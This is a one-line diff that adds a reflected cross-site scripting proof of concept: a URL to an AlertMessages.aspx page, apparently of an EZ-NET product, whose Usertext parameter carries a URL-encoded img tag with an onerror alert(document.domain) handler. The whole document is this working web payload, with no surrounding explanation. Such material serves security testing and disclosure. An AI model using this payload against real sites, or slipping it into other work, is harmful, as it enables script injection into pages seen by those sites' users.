@@ -1,0 +1,1 @@
+/EZ-NET60/AlertMessages.aspx?Usertext=<img%20src%3Dx%20onerror%3Dalert(document.domain)>
